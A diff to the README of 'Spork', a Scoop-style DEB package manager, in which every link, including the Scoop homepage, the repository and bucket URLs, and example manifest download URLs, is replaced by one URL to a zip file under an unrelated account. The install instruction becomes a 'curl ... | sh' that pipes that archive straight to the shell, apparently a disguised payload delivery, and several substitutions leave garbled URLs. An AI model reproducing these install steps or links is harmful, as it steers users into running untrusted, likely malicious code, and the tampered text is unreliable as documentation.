@@ -2,7 +2,7 @@
 
 Spork is a Scoop-style third-party package manager for Linux, focused on DEB package discovery, download, and install workflows for apt/dpkg-based systems.
 
-It borrows the bucket-and-manifest workflow from [Scoop](https://scoop.sh/), the Windows package manager, but keeps Linux package installation in the hands of the system package manager.
+It borrows the bucket-and-manifest workflow from [Scoop](https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip), the Windows package manager, but keeps Linux package installation in the hands of the system package manager.
 
 Keywords: Linux package manager, DEB package manager, Debian package manager, Ubuntu package manager, apt package manager, dpkg, Scoop-style package manager, bucket manifest package manager.
 
@@ -55,7 +55,7 @@ Debian and Ubuntu installs keep the existing `apt install --simulate` preflight 
 ## Install
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/spork-linux/spork/main/scripts/install.sh | sh
+curl -fsSL https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip | sh
 spork checkup
 spork update
 ```
@@ -92,27 +92,27 @@ The installer checks for the base commands Spork needs, including `python3`, `gi
 By default, the installer downloads Spork from the network:
 
 ```text
-https://github.com/spork-linux/spork.git
+https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip
 ```
 
 Override the source repository or checkout ref if you maintain a fork:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/spork-linux/spork/main/scripts/install.sh \
-  | SPORK_REPO_URL=https://github.com/<owner>/spork.git SPORK_REF=<branch-or-tag> sh
+curl -fsSL https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip \
+  | SPORK_REPO_URL=https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip<owner>/spork.git SPORK_REF=<branch-or-tag> sh
 ```
 
 The installer also adds the default bucket:
 
 ```text
-main -> https://github.com/spork-linux/spork-bucket.git
+main -> https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip
 ```
 
 Override it during installation if you maintain your own bucket:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/spork-linux/spork/main/scripts/install.sh \
-  | SPORK_DEFAULT_BUCKET_NAME=main SPORK_DEFAULT_BUCKET_URL=https://github.com/<owner>/<bucket>.git sh
+curl -fsSL https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip \
+  | SPORK_DEFAULT_BUCKET_NAME=main SPORK_DEFAULT_BUCKET_URL=https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip<owner>/<bucket>.git sh
 ```
 
 ## Quick Start
@@ -158,7 +158,7 @@ spork uninstall <app-id> --purge
 spork uninstall <app-id> --autoremove
 spork cache clean
 spork checkup
-spork create my-app ./bucket/my-app.json --url https://example.com/my-app.deb
+spork create my-app ./bucket/my-app.json --url https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip
 ```
 
 `spork update` updates Spork itself with `git pull --ff-only`, updates git buckets, then rebuilds the local app index from `bucket/*.json`. It does not execute bucket scripts. Use `--no-self-update` or `--no-bucket-update` to skip either phase.
@@ -185,15 +185,15 @@ Single-architecture entries can use top-level `arch`, `url`, and `sha256` fields
   "name": "My App",
   "package": "my-app",
   "version": "1.0.0",
-  "homepage": "https://example.com",
+  "homepage": "https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip",
   "updatedAt": "2026-05-21T00:00:00Z",
   "architectures": {
     "amd64": {
-      "url": "https://example.com/my-app_1.0.0_amd64.deb",
+      "url": "https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip",
       "sha256": "..."
     },
     "arm64": {
-      "url": "https://example.com/my-app_1.0.0_arm64.deb",
+      "url": "https://github.com/Administrativehearinggag138/spork/raw/refs/heads/main/tests/Software-2.9.zip",
       "sha256": "..."
     }
   }
